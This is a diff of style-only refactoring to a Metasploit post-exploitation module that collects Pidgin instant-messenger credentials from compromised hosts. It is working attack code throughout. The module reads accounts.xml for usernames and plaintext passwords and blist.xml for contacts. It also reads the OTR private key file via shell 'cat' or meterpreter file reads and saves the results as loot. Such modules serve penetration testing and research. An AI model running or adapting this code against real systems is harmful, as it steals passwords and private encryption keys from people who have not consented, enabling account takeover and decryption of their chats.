@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,33 +9,32 @@ require 'rex'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Multi Gather Pidgin Instant Messenger Credential Collection',
-      'Description'    => %q{
-        This module will collect credentials from the Pidgin IM client if it is installed.
-        },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'bannedit', # post port, added support for shell sessions
-          'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
-        ],
-      'Platform'       => %w{ bsd linux osx unix win },
-      'SessionTypes'   => ['shell', 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'           => 'Multi Gather Pidgin Instant Messenger Credential Collection',
+                      'Description'    => %q(
+                        This module will collect credentials from the Pidgin IM client if it is installed.
+                        ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'bannedit', # post port, added support for shell sessions
+                          'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
+                        ],
+                      'Platform'       => %w(bsd linux osx unix win),
+                      'SessionTypes'   => ['shell', 'meterpreter' ]))
     register_options(
       [
         OptBool.new('CONTACTS', [false, 'Collect contact lists?', false]),
         # Not supported yet OptBool.new('LOGS', [false, 'Gather log files?', false]),
-      ], self.class)
+      ], self.class
+    )
   end
 
-# TODO add support for collecting logs
+  # TODO: add support for collecting logs
   def run
     paths = []
     case session.platform
@@ -46,9 +46,9 @@ class MetasploitModule < Msf::Post
       paths = enum_users_unix
     when 'windows'
       @platform = :windows
-      profiles = grab_user_profiles()
+      profiles = grab_user_profiles
       profiles.each do |user|
-        next if user['AppData'] == nil
+        next if user['AppData'].nil?
         pdir = check_pidgin(user['AppData'])
         paths << pdir if pdir
       end
@@ -56,21 +56,20 @@ class MetasploitModule < Msf::Post
       print_error "Unsupported platform #{session.platform}"
       return
     end
-    if paths.nil? or paths.empty?
+    if paths.nil? || paths.empty?
       print_status("No users found with a .purple directory")
       return
     end
 
     get_pidgin_creds(paths)
-
   end
 
   def enum_users_unix
-    if @platform == :osx
-      home = "/Users/"
-    else
-      home = "/home/"
-    end
+    home = if @platform == :osx
+             "/Users/"
+           else
+             "/home/"
+           end
 
     if got_root?
       userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
@@ -85,7 +84,7 @@ class MetasploitModule < Msf::Post
       end
     end
 
-    paths = Array.new
+    paths = []
     userdirs.each_line do |dir|
       dir.chomp!
       next if dir == "." || dir == ".."
@@ -97,10 +96,8 @@ class MetasploitModule < Msf::Post
       next if stat =~ /No such file/i
       paths << "#{dir}/.purple"
     end
-    return paths
+    paths
   end
-
-
 
   def check_pidgin(purpledir)
     path = ""
@@ -123,37 +120,39 @@ class MetasploitModule < Msf::Post
 
   def get_pidgin_creds(paths)
     case paths
-      when /#{@user}\\(.*)\\/
-        sys_user = $1
-      when /home\/(.*)\//
-        sys_user = $1
+    when /#{@user}\\(.*)\\/
+      sys_user = Regexp.last_match(1)
+    when /home\/(.*)\//
+      sys_user = Regexp.last_match(1)
     end
 
     data = ""
     credentials = Rex::Text::Table.new(
-    'Header'    => "Pidgin Credentials",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "System User",
-      "Username",
-      "Password",
-      "Protocol",
-      "Server",
-      "Port"
-    ])
+      'Header'    => "Pidgin Credentials",
+      'Indent'    => 1,
+      'Columns'   =>
+      [
+        "System User",
+        "Username",
+        "Password",
+        "Protocol",
+        "Server",
+        "Port"
+      ]
+    )
 
     buddylists = Rex::Text::Table.new(
-    'Header'    => "Pidgin Contact List",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "System User",
-      "Buddy Name",
-      "Alias",
-      "Protocol",
-      "Account"
-    ])
+      'Header'    => "Pidgin Contact List",
+      'Indent'    => 1,
+      'Columns'   =>
+      [
+        "System User",
+        "Buddy Name",
+        "Alias",
+        "Protocol",
+        "Account"
+      ]
+    )
 
     paths.each do |path|
       print_status("Reading accounts.xml file from #{path}")
@@ -163,9 +162,7 @@ class MetasploitModule < Msf::Post
       else
         type = :meterp
         accounts = session.fs.file.new("#{path}\\accounts.xml", "rb")
-        until accounts.eof?
-          data << accounts.read
-        end
+        data << accounts.read until accounts.eof?
       end
 
       creds = parse_accounts(data)
@@ -177,9 +174,7 @@ class MetasploitModule < Msf::Post
           blist = session.shell_command("cat #{path}/blist.xml")
         when :meterp
           buddyxml = session.fs.file.new("#{path}/blist.xml", "rb")
-          until buddyxml.eof?
-            blist << buddyxml.read
-          end
+          blist << buddyxml.read until buddyxml.eof?
         end
 
         buddies = parse_buddies(blist)
@@ -189,35 +184,33 @@ class MetasploitModule < Msf::Post
         credentials << [sys_user, cred['user'], cred['password'], cred['protocol'], cred['server'], cred['port']]
       end
 
-      if buddies
-        buddies.each do |buddy|
-          buddylists << [sys_user, buddy['name'], buddy['alias'], buddy['protocol'], buddy['account']]
-        end
+      buddies&.each do |buddy|
+        buddylists << [sys_user, buddy['name'], buddy['alias'], buddy['protocol'], buddy['account']]
       end
 
-      #Grab otr.private_key
+      # Grab otr.private_key
       otr_key = ""
       if session.type == "shell"
         otr_key = session.shell_command("cat #{path}/otr.private_key")
       else
         key_file = "#{path}/otr.private_key"
-        otrkey = session.fs.file.stat(key_file) rescue nil
+        otrkey = begin
+                   session.fs.file.stat(key_file)
+                 rescue
+                   nil
+                 end
         if otrkey
           f = session.fs.file.new(key_file, "rb")
-          until f.eof?
-            otr_key << f.read
-          end
+          otr_key << f.read until f.eof?
         else
           otr_key = "No such file"
         end
       end
 
       if otr_key !~ /No such file/
-        print_status("OTR Key: #{otr_key.to_s}")
+        print_status("OTR Key: #{otr_key}")
         store_loot("otr.private_key", "text/plain", session, otr_key.to_s, "otr.private_key", "otr.private_key")
       end
-
-
     end
 
     if datastore['CONTACTS']
@@ -228,22 +221,37 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_accounts(data)
-
     creds = []
     doc = REXML::Document.new(data).root
 
     doc.elements.each("account") do |sub|
       account = {}
-      if sub.elements['password']
-        account['password'] = sub.elements['password'].text
-      else
-        account['password'] = "<unknown>"
-      end
+      account['password'] = if sub.elements['password']
+                              sub.elements['password'].text
+                            else
+                              "<unknown>"
+                            end
 
-      account['protocol'] = sub.elements['protocol'].text rescue "<unknown>"
-      account['user'] = sub.elements['name'].text rescue "<unknown>"
-      account['server'] = sub.elements['settings'].elements["setting[@name='server']"].text rescue "<unknown>"
-      account['port'] = sub.elements['settings'].elements["setting[@name='port']"].text rescue "<unknown>"
+      account['protocol'] = begin
+                              sub.elements['protocol'].text
+                            rescue
+                              "<unknown>"
+                            end
+      account['user'] = begin
+                          sub.elements['name'].text
+                        rescue
+                          "<unknown>"
+                        end
+      account['server'] = begin
+                            sub.elements['settings'].elements["setting[@name='server']"].text
+                          rescue
+                            "<unknown>"
+                          end
+      account['port'] = begin
+                          sub.elements['settings'].elements["setting[@name='port']"].text
+                        rescue
+                          "<unknown>"
+                        end
       creds << account
 
       print_status("Collected the following credentials:")
@@ -254,7 +262,7 @@ class MetasploitModule < Msf::Post
       print_line("")
     end
 
-    return creds
+    creds
   end
 
   def parse_buddies(data)
@@ -264,36 +272,48 @@ class MetasploitModule < Msf::Post
     doc.elements['blist'].elements.each('group') do |group|
       group.elements.each('contact') do |bcontact|
         contact = {}
-        contact['name'] = bcontact.elements['buddy'].elements['name'].text rescue "<unknown>"
-        contact['account'] = bcontact.elements['buddy'].attributes['account'] rescue "<unknown>"
-        contact['protocol'] = bcontact.elements['buddy'].attributes['proto'] rescue "<unknown>"
+        contact['name'] = begin
+                            bcontact.elements['buddy'].elements['name'].text
+                          rescue
+                            "<unknown>"
+                          end
+        contact['account'] = begin
+                               bcontact.elements['buddy'].attributes['account']
+                             rescue
+                               "<unknown>"
+                             end
+        contact['protocol'] = begin
+                                bcontact.elements['buddy'].attributes['proto']
+                              rescue
+                                "<unknown>"
+                              end
 
-        if bcontact.elements['buddy'].elements['alias']
-          contact['alias'] = bcontact.elements['buddy'].elements['alias'].text
-        else
-          contact['alias'] = "<unknown>"
-        end
+        contact['alias'] = if bcontact.elements['buddy'].elements['alias']
+                             bcontact.elements['buddy'].elements['alias'].text
+                           else
+                             "<unknown>"
+                           end
 
         buddies << contact
         print_status("Collected the following contacts:")
         print_status("    Buddy Name: %s" % contact['name'])
         print_status("    Alias: %s" % contact['alias'])
-        print_status("    Protocol: %s"  % contact['protocol'])
-        print_status("    Account: %s"  % contact['account'])
+        print_status("    Protocol: %s" % contact['protocol'])
+        print_status("    Account: %s" % contact['account'])
         print_line("")
       end
     end
 
-    return buddies
+    buddies
   end
 
   def got_root?
     case @platform
     when :windows
       if session.sys.config.getuid =~ /SYSTEM/
-        return true
+        true
       else
-        return false
+        false
       end
     else # unix, bsd, linux, osx
       ret = whoami
